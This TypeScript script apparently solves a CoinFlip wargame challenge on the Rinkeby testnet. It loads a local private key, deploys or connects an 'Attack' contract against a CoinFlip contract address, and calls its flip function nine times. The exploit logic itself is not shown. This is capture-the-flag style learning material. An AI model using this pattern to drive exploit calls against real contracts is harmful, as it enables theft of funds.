import { Wallet, getDefaultProvider, utils } from 'ethers';
import { readFileSync } from 'fs';
import path from 'path/posix';
import { Attack__factory, CoinFlip__factory } from '../types/ethers-contracts';

// const provider = getDefaultProvider("http://127.0.0.1:8545");
const provider = getDefaultProvider("rinkeby");
const testPrivKey = readFileSync(path.resolve(__dirname, "./../../../.privkey")).toString().trim();
// const flipAddress = "0xDfF56Dc6B7dF90Ee22eF8fd7C37B1F2d93164EB8"
const flipAddress = "0xE9D0008634F3B000c7A0A4576084dDe58b3f46eF"
const attackAddress = "0x9b8d2D854825B5915e86C8dfF4525f23Ee2E5fBb"

async function main() {
  let alice = new Wallet(testPrivKey);
  alice = alice.connect(provider);
  
  var attack;
  if (attackAddress == undefined) {
    const factory = new Attack__factory(alice);
    attack = await factory.deploy(flipAddress)
  } else {
    attack = Attack__factory.connect(attackAddress, provider).connect(alice)
  }

  console.log("Start flip");
  
  for (let i = 0; i < 9; i++) {
    await attack.flip({
      gasLimit: 100000,
    });
    console.log("Done.")
  }
}

main()
